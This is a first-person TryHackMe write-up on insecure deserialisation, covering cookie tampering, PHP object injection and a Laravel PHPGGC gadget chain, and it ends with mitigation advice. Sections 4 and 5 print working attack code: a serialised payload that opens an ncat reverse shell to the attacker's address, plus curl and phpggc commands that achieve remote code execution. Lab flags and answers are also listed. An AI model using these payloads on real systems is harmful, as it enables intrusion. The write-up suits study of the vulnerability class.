# TryHackMe — Insecure Deserialisation

**Category:** Web Application Security · **Platform:** TryHackMe · **Difficulty:** Hands-on learning room  
**Tools:** Kali Linux, Firefox Developer Tools, CyberChef, PHP, Netcat, cURL, PHPGGC  
**Environment:** An authorised TryHackMe lab accessed from Kali over OpenVPN  
**Completed:** November 2026

> <img width="1145" height="162" alt="forside" src="https://github.com/user-attachments/assets/4d52f55e-d520-4f97-96b3-194cc9dc6589" />
> TryHackMe *Insecure Deserialisation* room cover.

## Overview

This room explores what happens when a web application **deserialises untrusted data**. I worked through the difference between serialisation and encoding, identified a PHP serialisation function, modified a subscription property stored in a cookie, and demonstrated how PHP object injection can lead to remote code execution (RCE). The final exercise introduced **PHPGGC** and a Laravel gadget chain.

The main takeaway: **serialised data is not automatically trustworthy, and Base64 is not encryption**. If an application makes security decisions using data that a user can modify—or reconstructs attacker-controlled objects with dangerous behaviour—the impact can range from an authorisation bypass to command execution.

> **Scope:** All commands and results below come from an intentionally vulnerable TryHackMe environment. The target addresses and any provided keys/tokens are specific to that lab; they are not reusable against other systems. Do not test systems without authorisation.

## 1. Understanding serialisation and deserialisation (Tasks 2–3)

**Serialisation** turns an object or structured data into a representation that can be saved or transmitted. **Deserialisation** reconstructs the data or object later.

In PHP, the functions are `serialize()` and `unserialize()`. A simplified serialised object looks like this:

```text
O:5:"Notes":1:{s:7:"content";s:10:"You got it";}
```

- `O:5:"Notes"` identifies an object of class `Notes` (five characters).
- `:1:` indicates one property.
- `s:7:"content"` indicates a seven-character property name.
- `s:10:"You got it"` indicates a ten-character string value.

In Python, the `pickle` module provides `pickle.dumps()` and `pickle.loads()`. Pickled data is binary and can be **Base64-encoded** to make it easier to represent as text. Decoding Base64 does **not** make a pickle safe to load: unpickling data from an untrusted source can execute code.

Other language-specific mechanisms include Ruby's `Marshal` and Java's object serialisation.

## 2. Identifying a potential entry point (Task 4)

The room demonstrated an information-disclosure issue: a backup file ending in `~` could expose PHP source code. In the lab, inspecting the backup revealed a user-defined function:

```php
function HelloTHMSerialization($obj) {
    return serialize($obj);
}
```

This identifies where an object is **serialised**. By itself, it does not prove insecure deserialisation; the next step is to determine **where untrusted data is deserialised** and how that data influences application behaviour.

## 3. Manipulating a serialised cookie (Task 5)

**Target:** `http://10.113.144.205/case1/` *(temporary TryHackMe lab address)*

The note-sharing application uses a `user_data` cookie containing a Base64-encoded PHP object. A non-subscribed guest cannot use the **Share** function.

I opened **Firefox Developer Tools → Storage → Cookies**, located `user_data`, and decoded its value. The readable representation in the exercise was:

```text
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
```

The important part is the final property:

```text
isSubscribed → b:0 (false)
```

I changed the boolean value to `b:1` (`true`), encoded the modified data back to Base64 in CyberChef, and replaced the cookie value in Firefox.


> <img width="995" height="645" alt="3" src="https://github.com/user-attachments/assets/08037688-755a-49c9-9ab8-ef7442e71bf7" />
> CyberChef: the serialised `Notes` object with `isSubscribed` changed to `b:1`, followed by **To Base64**.

When I pressed **Share** again, the application accepted the modified subscription status and displayed the flag:

```text
THM{10101}
```

> <img width="1249" height="820" alt="2" src="https://github.com/user-attachments/assets/f5367c2f-225c-448a-8f98-d067cbcf4304" />


> Browser proof: note-sharing app displays `THM{10101}` after the modified cookie is used.

**Why it worked:** The server trusted a client-controlled subscription field. The problem was **trusting the cookie as an authority for access control**, not the fact that the cookie used Base64. The user role remained `guest` throughout.

## 4. PHP object injection and magic methods (Task 6)

**Target:** `http://10.113.144.205/case2/`

The second case introduced a different consequence: **remote code execution**. The vulnerable application took a Base64 value from the `decode` parameter and passed the resulting bytes to PHP's `unserialize()`.

Its server-side code included a class called `MaliciousUserData`, with a `__wakeup()` magic method that executed the object's `command` property. The method itself remained defined on the server; the attacker-controlled input only supplied the **object's property value**.

In my Kali lab, I created `generate.php` to produce a serialised object with the same class name and a command that would connect back to my VPN interface:

```php
<?php
class MaliciousUserData {
    public $command = 'ncat -nv 192.168.169.105 4444 -e /bin/sh';
}

$obj = new MaliciousUserData();
$serialized = serialize($obj);
$encoded = base64_encode($serialized);

echo "Serialisert:\n" . $serialized . "\n\n";
echo "URL:\n";
echo "http://10.113.144.205/case2/?decode="
     . rawurlencode($encoded) . "\n";
?>
```


> <img width="869" height="335" alt="4" src="https://github.com/user-attachments/assets/1e602ebf-f05d-4c90-bb97-a7db961e5f24" />
> `generate.php` in Nano, showing the serialisation and Base64 encoding steps.

Running `php generate.php` produced a URL containing the serialised payload. On Kali, I started a listener:

```bash
nc -lvnp 4444
```

I then opened the generated lab URL. The target deserialised the object, its existing `__wakeup()` method ran, and the listener received a connection. I verified the shell with `whoami` and located the lab flag:

```text
whoami
www-data

cat flag.php
<?php
$flag = "THM{GOT_THE_SH#LL}";
?>
```


> <img width="754" height="340" alt="5" src="https://github.com/user-attachments/assets/3716c464-7b8b-4a59-8433-e8677311d39a" />
> Netcat reverse shell connected from the PHP target; `whoami` returned `www-data`, and `flag.php` was read.

**Key distinction:** Unlike changing a subscription boolean, this exercise used an existing PHP magic method to trigger command execution. The returned shell belonged to **`www-data`**, not automatically to `root`.

## 5. PHPGGC and a Laravel gadget chain (Task 7)

**Target:** `http://10.113.144.205:8089/`  
**Framework shown in the room:** Laravel 5.6.29  
**Referenced vulnerability:** CVE-2018-15133

**PHPGGC** (*PHP Generic Gadget Chains*) generates serialised objects tailored to particular PHP frameworks and libraries. Rather than writing every object manually, I used a gadget chain compatible with the vulnerable Laravel environment.

First, I listed available chains:

```bash
phpggc -l Laravel
```

The selected chain was `Laravel/RCE3`, using `__destruct` as its execution vector. Separately, the room's answer to the CodeIgniter4/FR1 vector question was `__toString`.

The room supplied a lab-specific **APP_KEY** and an initial `whoami` payload via `/get-key`. Its helper page, `/cve.php`, encrypted the serialised payload into a value accepted in the `X-XSRF-TOKEN` request header. I submitted the generated token in a POST request:

```bash
read -r TOKEN
# Paste the X-XSRF-TOKEN value from the lab helper, then press Enter.

curl -sS -X POST \
  -H "X-XSRF-TOKEN: $TOKEN" \
  http://10.113.144.205:8089 | sed -n '1,5p'
```

The response began with:

```text
root
<!DOCTYPE html><!--
```

The application subsequently produced a framework error; however, the command output demonstrated that execution had already occurred.


> <img width="1292" height="303" alt="6" src="https://github.com/user-attachments/assets/49666e0c-0dd6-4854-83ec-4474c7b86053" />
> POST request containing `X-XSRF-TOKEN`; the vulnerable Laravel application returns `root`.

For the next question, I installed PHPGGC on Kali and generated a different command payload:

```bash
phpggc -l Laravel
PAYLOAD=$(phpggc -b Laravel/RCE3 system "uname -r" 2>/dev/null)
```

The `-b` option outputs Base64. `2>/dev/null` suppresses non-fatal PHP deprecation warnings in this lab's PHPGGC package.

Using the room's helper endpoint, I created a **new** encrypted token from the new payload:

```bash
curl -sSG 'http://10.113.144.205:8089/cve.php' \
  --data-urlencode 'app_key=<LAB_APP_KEY>' \
  --data-urlencode "payload=$PAYLOAD"
```

After copying the newly generated token into `TOKEN`, I sent another POST request:

```bash
read -r TOKEN
# Paste the new X-XSRF-TOKEN value.

curl -sS -X POST \
  -H "X-XSRF-TOKEN: $TOKEN" \
  http://10.113.144.205:8089 | sed -n '1,2p'
```

This time the response began with the target kernel release:

```text
5.15.0-1075-aws
<!DOCTYPE html><!--
```


> <img width="1288" height="592" alt="7" src="https://github.com/user-attachments/assets/66cd4b28-d79c-4ce5-bf53-84ba55ece717" />
> PHPGGC payload for `uname -r`, encryption through the lab helper, and the returned kernel version `5.15.0-1075-aws`.

**Why the APP_KEY matters:** The vulnerable Laravel path expected encrypted application data. The key was supplied by this lab, allowing the crafted serialised payload to be wrapped in a valid token. Encryption alone is not a substitute for safe handling of deserialised objects.

## 6. Mitigation and secure coding (Task 8)

From the exercises, the defensive priorities are:

1. **Do not deserialise untrusted object formats.** Prefer restricted data formats and schemas, such as JSON with explicit validation, when complex object reconstruction is unnecessary.
2. **Keep authorisation decisions server-side.** Do not trust a client-editable field such as `isSubscribed` as proof of entitlement.
3. **Avoid invoking code or shell commands from untrusted properties.** Functions like PHP's `eval()` and `exec()` become dangerous when attacker-controlled input reaches them.
4. **Use least privilege.** Run web applications under appropriately restricted accounts, and protect secrets such as framework `APP_KEY` values.
5. **Keep dependencies and frameworks updated.** Review deserialisation entry points, error handling, and exposed backup files.

The Task 8 question—whether it is good practice to blindly use `eval()`—has the answer **`nay`**.



## Results at a glance

| Task | Observation / answer |
| --- | --- |
| Task 2 | PHP serialisation function: `serialize()`; CVE-2015-4852 CVSS v2 base score: `7.5`; serialisation is not limited to saving a byte-stream file: `nay` |
| Task 3 | PHP: `serialize()` / `unserialize()`; Python: `pickle`; Ruby: `Marshal` |
| Task 4 | Exposed function: `HelloTHMSerialization` |
| Task 5 | Cookie property manipulation → `THM{10101}`; default role: `guest` |
| Task 6 | Object injection → `THM{GOT_THE_SH#LL}`; shell user: `www-data` |
| Task 7 | CodeIgniter4/FR1 vector: `__toString`; Laravel `whoami`: `root`; `uname -r`: `5.15.0-1075-aws` |
| Task 8 | Blind use of `eval()` is not recommended: `nay` |

